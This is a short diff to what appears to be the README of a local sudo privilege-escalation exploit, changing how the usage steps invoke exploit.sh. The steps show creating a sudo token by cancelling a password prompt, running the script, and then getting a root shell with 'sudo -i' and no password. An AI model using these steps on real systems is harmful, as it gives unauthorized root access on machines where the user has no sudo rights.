@@ -21,7 +21,7 @@ PS: read requirements!!
 ```sh
 $ sudo whatever
 [sudo] password for user:    # Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens.
-$ . exploit.sh # This activates our sudo token. (. script.sh == source script.sh)
+$ sh exploit.sh
 .... wait 1 seconds
 $ sudo -i # no password required :)
 # id
